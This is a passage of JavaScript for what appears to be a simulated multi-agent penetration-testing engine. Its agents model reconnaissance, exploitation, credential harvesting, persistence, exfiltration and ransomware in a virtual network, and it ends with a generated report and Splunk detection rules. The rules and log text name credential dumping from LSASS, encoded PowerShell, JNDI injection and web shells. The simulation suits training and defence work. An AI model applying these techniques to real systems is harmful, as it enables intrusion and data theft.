    const t = ENV_TEMPLATES[key];
    if (!t) return;
    this.hosts = JSON.parse(JSON.stringify(t.hosts));
    this.connections = JSON.parse(JSON.stringify(t.connections));
    this.hosts.forEach(h => {
      h.status = 'unknown';
      h.findings = [];
      h.sessions = [];
      h.persistence = [];
      h.exfilData = [];
      h.harvestedCreds = [];
    });
    this.intel = { credentials: [], sessions: [], services: [], vulns: [], data: [] };
    this.log = [];
    this.comms = [];
    this.threatScore = 0;
    this.tick = 0;
    this.completedPhases = new Set();
    this.ransomwareDone = false;
    this.c2Beacons = [];
    this.zerodays = [];
  }

  getHost(id) { return this.hosts.find(h => h.id === id); }

  addComm(from, to, msg) {
    var entry = { tick: this.tick, from: from, to: to, msg: msg, ts: new Date().toLocaleTimeString() };
    this.comms.push(entry);
    if (this.onComm) this.onComm(entry);
  }

  bumpThreat(amount) {
    this.threatScore = Math.min(100, this.threatScore + amount);
  }

  canReach(fromId, toId) {
    return this.connections.some(c =>
      (c.from === fromId && c.to === toId) || (c.bidir && c.from === toId && c.to === fromId)
    );
  }

  reachableFrom(fromId) {
    return this.hosts.filter(h => h.id !== fromId && this.canReach(fromId, h.id));
  }

  addLog(agent, msg, detail, mitre) {
    const entry = { tick: this.tick, agent, msg, detail: detail || '', mitre: mitre || '', ts: new Date().toLocaleTimeString() };
    this.log.push(entry);
    if (this.onLog) this.onLog(entry);
  }

  // ----- RECON AGENT -----
  runRecon() {
    if (!this.agents.RECON) return;
    const unknowns = this.hosts.filter(h => h.status === 'unknown');
    const discovered = this.hosts.filter(h => h.status === 'discovered');

    if (unknowns.length > 0) {
      // Prioritize high-value and reachable from compromised hosts
      const compromised = this.hosts.filter(h => h.sessions.length > 0);
      let target = null;
      if (compromised.length > 0) {
        for (const c of compromised) {
          const reachable = this.reachableFrom(c.id).filter(h => h.status === 'unknown');
          if (reachable.length > 0) { target = reachable.sort((a, b) => b.value - a.value)[0]; break; }
        }
      }
      if (!target) target = unknowns.sort((a, b) => b.value - a.value)[0];
      target.status = 'discovered';
      this.addLog('RECON', 'Discovered host: ' + target.name + ' (' + target.ip + ')', 'OS: ' + target.os + ' | Role: ' + target.role + ' | Segment: ' + target.segment, 'T1046');
      return;
    }

    if (discovered.length > 0) {
      const target = discovered.sort((a, b) => b.value - a.value)[0];
      target.status = 'scanned';
      const svcList = target.services.map(s => s.port + '/' + s.name + (s.version !== '*' ? ' ' + s.version : '')).join(', ');
      this.addLog('RECON', 'Port scan complete: ' + target.name, 'Open ports: ' + (svcList || 'none') + '\nSecurity controls: ' + (target.controls.length > 0 ? target.controls.join(', ') : 'none detected'), 'T1046');
      target.services.forEach(s => {
        this.intel.services.push({ hostId: target.id, service: s.name, port: s.port, version: s.version });
      });
      // Check for vulns
      target.services.forEach(svc => {
        const matches = VULN_DB.filter(v => v.service === svc.name && (v.version === '*' || svc.version === '*' || svc.version.includes(v.version.split('-')[0]) || v.version.includes(svc.version)));
        matches.forEach(v => {
          if (!this.intel.vulns.find(x => x.hostId === target.id && x.cve === v.cve)) {
            this.intel.vulns.push({ hostId: target.id, vuln: v });
            this.addLog('RECON', '[VULN] ' + target.name + ': ' + v.name + ' (' + v.cve + ')', 'CVSS: ' + v.cvss + ' | Type: ' + v.type + '\n' + v.desc, 'T1595');
            this.addComm('RECON', 'EXPLOIT', 'High-value target identified. ' + v.cve + ' on ' + target.name + ' (CVSS ' + v.cvss + '). Recommend immediate exploitation.');
            this.bumpThreat(3);
          }
        });
      });
      // Zero-day discovery — 5% chance when scanning web services
      if (target.services.some(s => s.name === 'http' || s.name === 'spring' || s.name === 'java' || s.name === 'tomcat') && Math.random() < 0.05 && this.zerodays.length === 0) {
        var zd = ZERO_DAY_TEMPLATES[Math.floor(Math.random() * ZERO_DAY_TEMPLATES.length)];
        var zdVuln = { service: zd.service, version: '*', cve: '0DAY-' + Date.now(), name: zd.name, cvss: zd.cvss, exploit: 'zero_day_custom', reliability: zd.reliability, stealth: 0.2, type: zd.type, os: 'any', desc: zd.desc, output: zd.output };
        this.zerodays.push({ hostId: target.id, vuln: zdVuln });
        this.intel.vulns.push({ hostId: target.id, vuln: zdVuln });
        this.addLog('RECON', '[0DAY] Novel vulnerability discovered on ' + target.name + ': ' + zd.name, zd.output + '\n\nCVSS: ' + zd.cvss + ' | Reliability: ' + (zd.reliability * 100).toFixed(0) + '% (untested)\nThis is a previously unknown vulnerability found via automated fuzzing.', 'T1190');
        this.addComm('RECON', 'EXPLOIT', 'CRITICAL: Zero-day discovered on ' + target.name + '. ' + zd.name + '. Untested — reliability ~' + (zd.reliability * 100).toFixed(0) + '%. Proceed with caution.');
        this.bumpThreat(8);
      }
      return;
    }
  }

  // ----- EXPLOIT AGENT -----
  runExploit() {
    if (!this.agents.EXPLOIT) return;
    const exploitable = this.intel.vulns.filter(v => {
      const h = this.getHost(v.hostId);
      return h && h.status === 'scanned' && h.sessions.length === 0;
    });
    if (exploitable.length === 0) return;

    // Sort by: reliability * (1 - detection by controls) * value
    exploitable.sort((a, b) => {
      const ha = this.getHost(a.hostId), hb = this.getHost(b.hostId);
      const scoreA = a.vuln.reliability * a.vuln.stealth * ha.value;
      const scoreB = b.vuln.reliability * b.vuln.stealth * hb.value;
      return scoreB - scoreA;
    });

    const best = exploitable[0];
    const host = this.getHost(best.hostId);
    const v = best.vuln;

    // Simulate exploit
    const hasEDR = host.controls.includes('edr');
    const hasAV = host.controls.includes('av');
    const detectionChance = (hasEDR ? 0.4 : 0) + (hasAV ? 0.2 : 0);
    const success = Math.random() > (1 - v.reliability) + detectionChance * 0.5;

    if (success) {
      host.status = 'exploited';
      const session = { hostId: host.id, user: v.os === 'windows' ? 'NT AUTHORITY\\SYSTEM' : 'root', accessLevel: 'SYSTEM', via: v.name };
      host.sessions.push(session);
      this.intel.sessions.push(session);
      this.addLog('EXPLOIT', '[SHELL] ' + host.name + ' via ' + v.name, v.output, v.mitre || 'T1210');
      this.addLog('EXPLOIT', '[DECISION] Chose ' + v.name + ' for ' + host.name, 'Reasoning: reliability=' + v.reliability.toFixed(2) + ', stealth=' + v.stealth.toFixed(2) + ', target_value=' + host.value + '/10' + (hasEDR ? ', EDR present (risk accepted)' : '') + (hasAV ? ', AV present' : ''), '');
      this.addComm('EXPLOIT', 'LATERAL', 'Shell established on ' + host.name + ' as ' + session.user + '. Requesting credential harvest and lateral movement.');
      this.bumpThreat(15);
    } else {
      this.addLog('EXPLOIT', '[FAILED] ' + v.name + ' on ' + host.name, 'Exploit failed' + (hasEDR ? ' — EDR may have blocked execution' : '') + (hasAV ? ' — AV detected payload signature' : ''), '');
      // Remove this vuln from queue to avoid retrying
      const idx = this.intel.vulns.indexOf(best);
      if (idx >= 0) this.intel.vulns.splice(idx, 1);
    }
  }

  // ----- LATERAL AGENT -----
  runLateral() {
    if (!this.agents.LATERAL) return;
    const compromised = this.hosts.filter(h => h.sessions.length > 0);
    if (compromised.length === 0) return;

    // First: harvest creds from newly compromised hosts
    const unharvested = compromised.filter(h => h.harvestedCreds.length === 0);
    if (unharvested.length > 0) {
      const target = unharvested[0];
      const os = target.os.toLowerCase();
      const isWin = os.includes('windows');
      const applicable = CRED_HARVEST.filter(c => c.os === 'any' || (isWin && c.os === 'windows') || (!isWin && c.os === 'linux'));
      const technique = applicable[Math.floor(Math.random() * Math.min(3, applicable.length))];
      // Simulate finding creds
      const found = [];
      // Add host's own creds
      if (target.creds) target.creds.forEach(c => found.push(Object.assign({}, c, { source: target.id })));
      // Add some discovered creds
      this.hosts.forEach(h => {
        if (h.creds && h.creds.length > 0 && Math.random() > 0.5) {
          h.creds.forEach(c => {
            if (c.pass || c.hash) found.push(Object.assign({}, c, { source: target.id }));
          });
        }
      });
      target.harvestedCreds = found;
      found.forEach(c => {
        if (!this.intel.credentials.find(x => x.user === c.user && x.source === c.source)) {
          this.intel.credentials.push(c);
        }
      });
      if (found.length > 0) {
        this.addLog('LATERAL', '[HARVEST] Credentials from ' + target.name + ' via ' + technique.name, technique.output + '\n[+] ' + found.length + ' credential(s) extracted', technique.mitre || 'T1003');
        var domainCreds = found.filter(function(c) { return c.domain || c.hash; });
        if (domainCreds.length > 0) this.addComm('LATERAL', 'PERSIST', 'Domain credential obtained from ' + target.name + '. ' + domainCreds.length + ' domain-level credential(s). Recommend golden ticket persistence.');
        else this.addComm('LATERAL', 'EXPLOIT', found.length + ' local credential(s) from ' + target.name + '. Testing against adjacent hosts.');
        this.bumpThreat(8);
      }
      return;
    }

    // Then: move laterally
    const uncompromised = this.hosts.filter(h => h.sessions.length === 0 && h.status !== 'unknown');
    if (uncompromised.length === 0) return;

    // Find reachable targets from compromised hosts
    for (const ch of compromised) {
      const reachable = this.reachableFrom(ch.id).filter(h => h.sessions.length === 0 && h.status !== 'unknown');
      if (reachable.length === 0) continue;
      const target = reachable.sort((a, b) => b.value - a.value)[0];
      const isWinTarget = target.os.toLowerCase().includes('windows');

      // Pick technique
      const techniques = LATERAL_TECHNIQUES.filter(t => t.os === 'any' || (isWinTarget && t.os === 'windows') || (!isWinTarget && t.os === 'linux'));
      const tech = techniques.sort((a, b) => (b.reliability * b.stealth) - (a.reliability * a.stealth))[0];

      const success = Math.random() < tech.reliability;
      if (success) {
        target.status = 'exploited';
        const session = { hostId: target.id, user: isWinTarget ? 'CORP\\admin' : 'root', accessLevel: 'admin', via: tech.name };
        target.sessions.push(session);
        this.intel.sessions.push(session);
        this.addLog('LATERAL', '[MOVED] ' + ch.name + ' -> ' + target.name + ' via ' + tech.name, tech.output.replace(/10\.0\.0\.\d+/g, target.ip), tech.mitre);
        this.addLog('LATERAL', '[DECISION] Chose ' + tech.name + ' to ' + target.name, 'Reasoning: target_value=' + target.value + '/10, reliability=' + tech.reliability.toFixed(2) + ', stealth=' + tech.stealth.toFixed(2) + ', protocol=' + tech.protocol + (target.controls.includes('edr') ? ', WARNING: EDR present' : ''), '');
        this.addComm('LATERAL', 'PERSIST', 'Moved to ' + target.name + ' (' + target.role + '). Requesting persistence implant. Access: ' + session.user);
        if (target.role.includes('Domain Controller')) this.addComm('LATERAL', 'EXFIL', 'CRITICAL: Domain Controller ' + target.name + ' compromised. NTDS.dit dump available. Initiate exfiltration.');
        this.bumpThreat(12);
      } else {
        this.addLog('LATERAL', '[BLOCKED] ' + tech.name + ' to ' + target.name + ' failed', 'Authentication failed or blocked by security controls', '');
      }
      return;
    }
  }

  // ----- PERSIST AGENT -----
  runPersist() {
    if (!this.agents.PERSIST) return;
    const needsPersistence = this.hosts.filter(h => h.sessions.length > 0 && h.persistence.length === 0);
    if (needsPersistence.length === 0) return;

    const target = needsPersistence.sort((a, b) => b.value - a.value)[0];
    const isWin = target.os.toLowerCase().includes('windows');
    const methods = PERSISTENCE_METHODS.filter(m => m.os === 'any' || (isWin && m.os === 'windows') || (!isWin && m.os === 'linux'));

    // Pick least detectable method
    const hasEDR = target.controls.includes('edr');
    const hasSIEM = target.controls.includes('siem_agent');
    const method = methods.sort((a, b) => {
      const scoreA = a.stealth - (hasEDR ? a.detection * 0.5 : 0) - (hasSIEM ? a.detection * 0.3 : 0);
      const scoreB = b.stealth - (hasEDR ? b.detection * 0.5 : 0) - (hasSIEM ? b.detection * 0.3 : 0);
      return scoreB - scoreA;
    })[0];

    target.persistence.push(method);
    target.status = 'persisted';
    this.addLog('PERSIST', '[IMPLANT] ' + method.name + ' on ' + target.name, '$ ' + method.cmd + '\n[+] Persistence established\nDetection risk: ' + (method.detection * 100).toFixed(0) + '%' + (hasEDR ? ' (EDR increases risk)' : ''), method.mitre);
    this.addComm('PERSIST', 'EXFIL', 'Persistence established on ' + target.name + ' via ' + method.name + '. Host is now a reliable staging point. Ready for data extraction.');
    this.bumpThreat(5);
  }

  // ----- EXFIL AGENT -----
  runExfil() {
    if (!this.agents.EXFIL) return;
    const targets = this.hosts.filter(h => h.sessions.length > 0 && h.exfilData.length === 0 && h.value >= 7);
    if (targets.length === 0) return;

    const target = targets.sort((a, b) => b.value - a.value)[0];
    const dataTypes = [];
    if (target.role.includes('Database') || target.services.some(s => s.name === 'mysql' || s.name === 'mssql')) dataTypes.push({ type: 'Database dump', size: '2.3 GB', sensitivity: 'Critical' });
    if (target.role.includes('Domain Controller')) dataTypes.push({ type: 'NTDS.dit (all domain hashes)', size: '450 MB', sensitivity: 'Critical' });
    if (target.role.includes('Backup')) dataTypes.push({ type: 'Backup archives', size: '15 GB', sensitivity: 'High' });
    if (target.role.includes('Exchange') || target.role.includes('Mail')) dataTypes.push({ type: 'Email PST archives', size: '8.2 GB', sensitivity: 'High' });
    if (target.role.includes('Workstation')) dataTypes.push({ type: 'Documents and browser data', size: '340 MB', sensitivity: 'Medium' });
    if (target.role.includes('Engineering') || target.role.includes('HMI')) dataTypes.push({ type: 'PLC project files and configurations', size: '120 MB', sensitivity: 'Critical' });
    if (target.role.includes('Historian')) dataTypes.push({ type: 'Process data and SCADA configs', size: '5.1 GB', sensitivity: 'Critical' });
    if (dataTypes.length === 0) dataTypes.push({ type: 'System files and configs', size: '50 MB', sensitivity: 'Medium' });

    // Choose exfil method based on controls
    const hasDLP = target.controls.includes('dlp');
    const hasProxy = target.controls.includes('proxy');
    const methods = EXFIL_METHODS.sort((a, b) => {
      const sA = a.stealth - (hasDLP ? 0.3 : 0) - (hasProxy ? 0.2 : 0);
      const sB = b.stealth - (hasDLP ? 0.3 : 0) - (hasProxy ? 0.2 : 0);
      return sB - sA;
    });
    const method = methods[0];

    target.exfilData = dataTypes;
    target.status = 'exfiltrated';
    const dataDesc = dataTypes.map(d => d.type + ' (' + d.size + ', ' + d.sensitivity + ')').join('\n  ');
    this.addLog('EXFIL', '[DATA] Exfiltrating from ' + target.name + ' via ' + method.name, 'Target data:\n  ' + dataDesc + '\n\nMethod: ' + method.name + ' (' + method.desc + ')\nBandwidth: ' + method.bandwidth + '\nEstimated detection risk: ' + ((1 - method.stealth) * 100).toFixed(0) + '%', method.mitre);
    this.addComm('EXFIL', 'RECON', 'Exfiltration complete from ' + target.name + '. ' + dataTypes.length + ' data set(s) extracted via ' + method.name + '. Mission objective achieved for this target.');
    this.bumpThreat(20);
  }

  // ----- C2 BEACON SIMULATION -----
  runC2() {
    var persisted = this.hosts.filter(function(h) { return h.persistence.length > 0; });
    if (persisted.length === 0) return;
    persisted.forEach(function(h) {
      if (!this.c2Beacons.find(function(b) { return b.hostId === h.id; })) {
        var channels = ['HTTPS', 'DNS', 'ICMP'];
        var channel = channels[Math.floor(Math.random() * channels.length)];
        var jitter = Math.floor(Math.random() * 30) + 10;
        this.c2Beacons.push({ hostId: h.id, channel: channel, interval: 60, jitter: jitter, lastBeacon: this.tick });
        this.addLog('PERSIST', '[C2] Beacon established: ' + h.name + ' -> Attacker C2', 'Channel: ' + channel + '\nBeacon interval: 60s +/- ' + jitter + 's jitter\nFirst callback registered\nC2 protocol: Encrypted ' + channel + ' with domain fronting', 'T1071.001');
      }
    }.bind(this));
  }

  // ----- RANSOMWARE SIMULATION -----
  runRansomware() {
    if (!this.ransomwareEnabled || this.ransomwareDone) return;
    var exfilHosts = this.hosts.filter(function(h) { return h.exfilData.length > 0; });
    if (exfilHosts.length === 0) return;
    this.ransomwareDone = true;
    var compromised = this.hosts.filter(function(h) { return h.sessions.length > 0; });
    var totalGB = 0;
    var encryptedHosts = [];
    var backupCompromised = false;
    compromised.forEach(function(h) {
      var gb = 0;
      if (h.role.indexOf('Database') >= 0 || h.services.some(function(s) { return s.name === 'mysql' || s.name === 'mssql'; })) gb = 500;
      else if (h.role.indexOf('Domain Controller') >= 0) gb = 200;
      else if (h.role.indexOf('Backup') >= 0) { gb = 2000; backupCompromised = true; }
      else if (h.role.indexOf('Exchange') >= 0 || h.role.indexOf('Mail') >= 0) gb = 800;
      else if (h.role.indexOf('Historian') >= 0) gb = 300;
      else if (h.role.indexOf('EMR') >= 0) gb = 600;
      else if (h.role.indexOf('SWIFT') >= 0 || h.role.indexOf('Core Banking') >= 0) gb = 1000;
      else gb = Math.floor(Math.random() * 100) + 20;
      totalGB += gb;
      encryptedHosts.push({ name: h.name, role: h.role, gb: gb });
      h.ransomware = true;
    }.bind(this));
    var downtimeHours = compromised.length * 24 + (backupCompromised ? 168 : 0);
    var costEstimate = (totalGB * 50 + downtimeHours * 5000).toLocaleString();
    this.addLog('EXPLOIT', '[RANSOMWARE] Encryption deployed across ' + compromised.length + ' hosts', 'Encrypted hosts:\n' + encryptedHosts.map(function(h) { return '  ' + h.name + ' (' + h.role + '): ~' + h.gb + ' GB'; }).join('\n') + '\n\nTotal data encrypted: ' + totalGB + ' GB\nEstimated downtime: ' + downtimeHours + ' hours\nEstimated business impact: $' + costEstimate + '\nBackup server compromised: ' + (backupCompromised ? 'YES - CRITICAL: Recovery without ransom is impossible' : 'No - Recovery from backups possible') + '\n\n--- RANSOM NOTE ---\nYour network has been encrypted by HYDRA.\nAll files have been encrypted with AES-256.\nDo not attempt to decrypt files manually.\nContact the operator for decryption key.\nPrice: 50 BTC ($3.2M)\nDeadline: 72 hours before data is published.\n--- END NOTE ---', 'T1486');
    this.bumpThreat(30);
    this.intel.ransomware = { encryptedHosts: encryptedHosts, totalGB: totalGB, downtimeHours: downtimeHours, costEstimate: costEstimate, backupCompromised: backupCompromised };
  }

  // ----- STEP ENGINE -----
  step() {
    this.tick++;
    var phases = ['RECON', 'EXPLOIT', 'LATERAL', 'PERSIST', 'EXFIL'];
    // Run agents in kill-chain order
    this.runRecon();
    if (this.tick > 2) this.runExploit();
    if (this.tick > 4) this.runLateral();
    if (this.tick > 6) this.runPersist();
    if (this.tick > 8) this.runExfil();
    if (this.tick > 6) this.runC2();
    if (this.tick > 12 && this.ransomwareEnabled) this.runRansomware();

    if (this.onUpdate) this.onUpdate();

    // Check completion
    const allScanned = this.hosts.every(h => h.status !== 'unknown' && h.status !== 'discovered');
    const anyExfil = this.hosts.some(h => h.exfilData.length > 0);
    if (allScanned && anyExfil && this.tick > 15) {
      this.running = false;
      this.addLog('RECON', '[COMPLETE] Autonomous pentest operation finished', 'Ticks: ' + this.tick + ' | Hosts compromised: ' + this.hosts.filter(h => h.sessions.length > 0).length + '/' + this.hosts.length + ' | Credentials harvested: ' + this.intel.credentials.length + ' | Data exfiltrated from: ' + this.hosts.filter(h => h.exfilData.length > 0).length + ' hosts', '');
      if (this.onComplete) this.onComplete();
      return true;
    }
    return false;
  }

  start(speed) {
    this.speed = speed || 1;
    this.running = true;
    this.paused = false;
    const delay = Math.max(100, 1500 / this.speed);
    const tick = () => {
      if (!this.running || this.paused) return;
      const done = this.step();
      if (!done) this.stepTimer = setTimeout(tick, delay);
    };
    tick();
  }

  pause() { this.paused = true; }
  resume() { this.paused = false; this.start(this.speed); }
  stop() { this.running = false; clearTimeout(this.stepTimer); }

  // ----- DEFENSE ANALYSIS -----
  getDefenseAnalysis() {
    const findings = [];
    this.log.forEach(entry => {
      if (entry.msg.includes('[SHELL]') || entry.msg.includes('[MOVED]') || entry.msg.includes('[IMPLANT]') || entry.msg.includes('[DATA]')) {
        const host = this.hosts.find(h => entry.msg.includes(h.name));
        findings.push({
          phase: entry.agent,
          action: entry.msg,
          mitre: entry.mitre,
          host: host ? host.name : 'unknown',
          controls: host ? host.controls : [],
          detection: getDetectionForTechnique(entry.mitre),
        });
      }
    });
    return findings;
  }

  // ----- REPORT GENERATION -----
  generateReport() {
    const compromised = this.hosts.filter(h => h.sessions.length > 0);
    const findings = this.intel.vulns.map(v => {
      const h = this.getHost(v.hostId);
      return { host: h ? h.name : 'unknown', ip: h ? h.ip : '', vuln: v.vuln.name, cve: v.vuln.cve, cvss: v.vuln.cvss, type: v.vuln.type, desc: v.vuln.desc };
    });
    findings.sort((a, b) => b.cvss - a.cvss);

    let report = '=== HYDRA PENETRATION TEST REPORT ===\n';
    report += 'Generated: ' + new Date().toISOString() + '\n\n';
    report += '--- EXECUTIVE SUMMARY ---\n';
    report += 'Hosts tested: ' + this.hosts.length + '\n';
    report += 'Hosts compromised: ' + compromised.length + ' (' + (compromised.length / this.hosts.length * 100).toFixed(0) + '%)\n';
    report += 'Critical findings: ' + findings.filter(f => f.cvss >= 9.0).length + '\n';
    report += 'High findings: ' + findings.filter(f => f.cvss >= 7.0 && f.cvss < 9.0).length + '\n';
    report += 'Credentials harvested: ' + this.intel.credentials.length + '\n';
    report += 'Data exfiltration points: ' + this.hosts.filter(h => h.exfilData.length > 0).length + '\n\n';

    report += '--- FINDINGS ---\n';
    findings.forEach((f, i) => {
      report += '\n[' + (i + 1) + '] ' + f.vuln + ' (' + f.cve + ')\n';
      report += '    Host: ' + f.host + ' (' + f.ip + ')\n';
      report += '    CVSS: ' + f.cvss + ' | Type: ' + f.type + '\n';
      report += '    Description: ' + f.desc + '\n';
    });

    report += '\n--- ATTACK NARRATIVE ---\n';
    this.log.filter(e => e.msg.includes('[') && !e.msg.includes('[DECISION]')).forEach(e => {
      report += '[Tick ' + e.tick + '] [' + e.agent + '] ' + e.msg + '\n';
    });

    report += '\n--- METHODOLOGY ---\n';
    report += 'This assessment was conducted using the HYDRA Autonomous Pentest Engine,\n';
    report += 'which deploys a multi-agent attack team following the Cyber Kill Chain\n';
    report += 'methodology (Lockheed Martin) mapped to the MITRE ATT&CK framework.\n\n';
    report += 'Five autonomous agents operated in sequence:\n';
    report += '  RECON   - Network discovery, service enumeration, vulnerability identification\n';
    report += '  EXPLOIT - Vulnerability exploitation using known CVEs and misconfigurations\n';
    report += '  LATERAL - Credential harvesting and lateral movement across network segments\n';
    report += '  PERSIST - Establishing persistence mechanisms on compromised hosts\n';
    report += '  EXFIL   - Data identification and exfiltration operations\n';

    report += '\n--- RISK RATING MATRIX ---\n';
    report += '                  |  Negligible  |    Minor    |   Moderate  |    Major    |   Critical  |\n';
    report += '  Almost Certain  |     Low      |   Medium    |    High     |   Critical  |   Critical  |\n';
    report += '  Likely          |     Low      |   Medium    |    High     |    High     |   Critical  |\n';
    report += '  Possible        |     Low      |    Low      |   Medium    |    High     |    High     |\n';
    report += '  Unlikely        |  Negligible  |    Low      |    Low      |   Medium    |    High     |\n';
    report += '  Rare            |  Negligible  |  Negligible |    Low      |    Low      |   Medium    |\n';

    report += '\n--- COMPLIANCE IMPLICATIONS ---\n';
    var critFindings = findings.filter(function(f) { return f.cvss >= 9.0; });
    var highFindings = findings.filter(function(f) { return f.cvss >= 7.0 && f.cvss < 9.0; });
    if (critFindings.length > 0) {
      report += 'PCI DSS v4.0: FAIL — Requirement 6.2 (patch management), 11.3 (penetration testing)\n';
      report += 'HIPAA: VIOLATION — 164.312(a)(1) Access Control, 164.312(e)(1) Transmission Security\n';
      report += 'NIST CSF: GAPS — PR.IP (Protective Technology), DE.CM (Security Continuous Monitoring)\n';
      report += 'ISO 27001: NON-CONFORMITY — A.12.6 (Technical vulnerability management)\n';
      report += 'SOC 2 Type II: EXCEPTION — CC6.1 (Logical Access), CC7.1 (System Monitoring)\n';
    }
    if (highFindings.length > 0) {
      report += 'GDPR Art. 32: CONCERN — Failure to implement appropriate technical measures\n';
      report += 'CIS Controls v8: GAPS — Controls 7 (Vulnerability Management), 3 (Data Protection)\n';
    }

    report += '\n--- COST OF BREACH ESTIMATE ---\n';
    report += '(Based on IBM Cost of a Data Breach Report 2024 averages)\n';
    var avgCost = 4450000;
    var industry = 'General';
    this.hosts.forEach(function(h) {
      if (h.role.indexOf('EMR') >= 0 || h.role.indexOf('Patient') >= 0) { avgCost = 10930000; industry = 'Healthcare'; }
      if (h.role.indexOf('SWIFT') >= 0 || h.role.indexOf('Banking') >= 0 || h.role.indexOf('Trading') >= 0) { avgCost = 5900000; industry = 'Financial'; }
      if (h.role.indexOf('PLC') >= 0 || h.role.indexOf('HMI') >= 0 || h.role.indexOf('SCADA') >= 0) { avgCost = 4730000; industry = 'Industrial'; }
    });
    var recordCount = this.hosts.filter(function(h) { return h.exfilData.length > 0; }).length * 50000;
    var perRecord = 165;
    report += 'Industry: ' + industry + '\n';
    report += 'Average breach cost (' + industry + '): $' + avgCost.toLocaleString() + '\n';
    report += 'Estimated records exposed: ~' + recordCount.toLocaleString() + '\n';
    report += 'Cost per record: $' + perRecord + '\n';
    report += 'Estimated total impact: $' + (Math.max(avgCost, recordCount * perRecord)).toLocaleString() + '\n';
    if (this.intel.ransomware) {
      report += '\nRansomware impact: ' + this.intel.ransomware.totalGB + ' GB encrypted\n';
      report += 'Estimated downtime: ' + this.intel.ransomware.downtimeHours + ' hours\n';
      report += 'Backup compromised: ' + (this.intel.ransomware.backupCompromised ? 'YES' : 'No') + '\n';
    }

    report += '\n--- REMEDIATION ROADMAP ---\n';
    report += 'Priority 1 — CRITICAL (Immediate):\n';
    report += '  1. Patch all CVEs with CVSS >= 9.0 within 24 hours\n';
    report += '  2. Reset all credentials found during the assessment\n';
    report += '  3. Isolate compromised segments until remediation is verified\n';
    report += 'Priority 2 — HIGH (7 days):\n';
    report += '  4. Deploy EDR on all servers and workstations\n';
    report += '  5. Enable MFA for all admin and remote access\n';
    report += '  6. Implement network segmentation between tiers\n';
    report += 'Priority 3 — MEDIUM (30 days):\n';
    report += '  7. Remove default credentials from all services\n';
    report += '  8. Enable Kerberos AES encryption, disable RC4\n';
    report += '  9. Configure SIEM alerts for lateral movement indicators\n';
    report += '  10. Implement privileged access management (PAM)\n';
    report += 'Priority 4 — LOW (90 days):\n';
    report += '  11. Disable unnecessary services and ports\n';
    report += '  12. Implement application whitelisting on critical servers\n';
    report += '  13. Conduct security awareness training\n';

    report += '\n--- SCOPE AND LIMITATIONS ---\n';
    report += 'This assessment was conducted in a controlled environment. Real-world results\n';
    report += 'may vary based on network conditions, security controls not modeled, and\n';
    report += 'environmental factors. The assessment does not account for:\n';
    report += '  - Physical security controls\n';
    report += '  - Social engineering resistance\n';
    report += '  - Incident response team reaction time\n';
    report += '  - Network performance degradation during attacks\n';
    report += '  - Zero-day vulnerabilities not in the database\n';
    report += '  - Supply chain compromise vectors\n';

    return report;
  }
}

function getDetectionForTechnique(mitre) {
  const map = {
    'T1046': { source: 'Firewall/IDS logs', rule: 'Alert on port scan patterns (>20 ports in 60s from single source)', splunk: 'index=firewall src_ip=* | stats dc(dest_port) as ports by src_ip | where ports > 20' },
    'T1210': { source: 'Endpoint/SIEM', rule: 'Alert on exploit payload signatures in network traffic', splunk: 'index=ids alert.signature="*exploit*" OR alert.signature="*shellcode*" | stats count by src_ip dest_ip alert.signature' },
    'T1003': { source: 'Sysmon/EDR', rule: 'Alert on LSASS memory access (Event ID 10, target=lsass.exe)', splunk: 'index=sysmon EventCode=10 TargetImage="*lsass.exe" | where SourceImage!="*csrss.exe" AND SourceImage!="*services.exe"' },
    'T1550.002': { source: 'Windows Security Log', rule: 'Logon Type 9 (NewCredentials) with NTLM authentication', splunk: 'index=wineventlog EventCode=4624 Logon_Type=9 | table _time src_ip Account_Name' },
    'T1047': { source: 'Sysmon/Windows', rule: 'WMI process creation from remote host', splunk: 'index=sysmon EventCode=1 ParentImage="*wmiprvse.exe" | table _time Image CommandLine User' },
    'T1547.001': { source: 'Sysmon/Registry', rule: 'Registry modification in Run/RunOnce keys', splunk: 'index=sysmon EventCode=13 TargetObject="*CurrentVersion\\\\Run*" | table _time Image TargetObject Details' },
    'T1053.005': { source: 'Windows Security', rule: 'Scheduled task creation (Event ID 4698)', splunk: 'index=wineventlog EventCode=4698 | table _time SubjectUserName TaskName TaskContent' },
    'T1048.002': { source: 'Proxy/Firewall', rule: 'Unusual outbound data volume to external hosts', splunk: 'index=proxy | stats sum(bytes_out) as total by dest_ip | where total > 100000000 | sort -total' },
    'T1558.001': { source: 'AD/Kerberos', rule: 'TGT with anomalous lifetime or encryption type', splunk: 'index=wineventlog EventCode=4769 Ticket_Encryption_Type=0x17 | table _time Account_Name Service_Name Client_Address' },
    'T1190': { source: 'WAF/IDS/Web Logs', rule: 'Alert on known exploit patterns in HTTP requests (path traversal, SQLi, deserialization)', splunk: 'index=web (uri_path="*../*" OR uri_query="*UNION*SELECT*" OR uri_query="*${jndi:*") | stats count by src_ip uri_path status' },
    'T1078': { source: 'Windows Security/Cloud', rule: 'Successful login with previously unused account or from new source', splunk: 'index=wineventlog EventCode=4624 Logon_Type=10 | stats earliest(_time) as first_seen by Account_Name src_ip | where first_seen > relative_time(now(),"-24h")' },
    'T1059': { source: 'Sysmon/EDR', rule: 'Unusual command interpreter execution (cmd, powershell, wscript, cscript, mshta)', splunk: 'index=sysmon EventCode=1 (Image="*cmd.exe" OR Image="*powershell.exe" OR Image="*wscript.exe" OR Image="*mshta.exe") | stats count by ParentImage Image CommandLine' },
    'T1059.001': { source: 'PowerShell/Sysmon', rule: 'Encoded or obfuscated PowerShell script block (Event ID 4104)', splunk: 'index=powershell EventCode=4104 (ScriptBlockText="*-enc*" OR ScriptBlockText="*FromBase64*" OR ScriptBlockText="*IEX*" OR ScriptBlockText="*Invoke-Expression*") | table _time ComputerName ScriptBlockText' },
    'T1053.003': { source: 'Linux Audit/syslog', rule: 'New cron job created by non-root user or in unusual location', splunk: 'index=linux sourcetype=syslog "CRON" ("REPLACE" OR "INSTALL") | table _time host message' },
    'T1543.003': { source: 'Windows System', rule: 'New Windows service installed (Event ID 7045)', splunk: 'index=wineventlog source="System" EventCode=7045 | table _time Service_Name Service_File_Name Service_Type Service_Start_Type' },
    'T1505.003': { source: 'File Integrity/Sysmon', rule: 'New file created in web server directories (.php, .jsp, .aspx, .ashx)', splunk: 'index=sysmon EventCode=11 (TargetFilename="*wwwroot*" OR TargetFilename="*htdocs*" OR TargetFilename="*www*") (TargetFilename="*.php" OR TargetFilename="*.jsp" OR TargetFilename="*.aspx") | table _time Image TargetFilename' },
